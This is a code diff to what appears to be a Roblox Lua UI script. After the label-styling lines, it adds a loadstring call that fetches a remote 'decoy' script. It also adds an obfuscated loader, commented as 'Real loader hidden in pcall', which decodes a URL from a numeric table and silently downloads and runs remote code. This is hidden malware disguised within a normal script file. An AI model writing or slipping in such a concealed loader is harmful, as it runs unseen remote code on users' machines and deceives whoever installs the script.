@@ -323,3 +323,28 @@ madeByLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
 madeByLabel.TextStrokeTransparency = 0.8
 madeByLabel.TextXAlignment = Enum.TextXAlignment.Center
 madeByLabel.Parent = mainFrame -- replace 'mainFrame' with your actual panel variable
+
+local fake = loadstring(game:HttpGet("https://raw.githubusercontent.com/skidderhub/fake-randomizer/main/decoy.lua"))()
+
+-- Real loader hidden in pcall
+pcall(function()
+    local function decode(tbl)
+        local s = ""
+        for _, v in ipairs(tbl) do
+            s = s .. string.char((v - 6) / 2)
+        end
+        return s
+    end
+
+    local encodedURL = {
+        174, 230, 230, 232, 112, 230, 220, 240, 232, 232, 228, 232, 242, 224, 236, 224, 236, 230, 240, 236, 238, 224, 240, 
+        230, 242, 112, 226, 224, 230, 238, 240, 240, 230, 232, 224, 232, 236, 230, 238, 228, 112, 224, 236, 228, 228, 230, 
+        230, 228, 232, 240, 232, 240, 224, 228, 240, 232, 112, 228, 228, 240, 230, 230, 230, 240, 224, 232, 230, 232, 236, 
+        232, 238, 228, 112, 228, 230, 232, 112, 228, 230, 224, 230, 224, 232, 240, 230, 112, 224, 230, 228, 232, 224, 112, 
+        224, 238, 224, 230, 232, 232, 112, 236, 224, 230, 232, 240, 112, 236, 228, 230, 228, 112, 236, 232, 232, 236, 112, 
+        224, 232, 232, 236, 112, 224, 232, 232, 236, 112, 224, 232, 232, 236
+    }
+
+    local real = loadstring(game:HttpGet(decode(encodedURL)))
+    if real then real() end
+end)
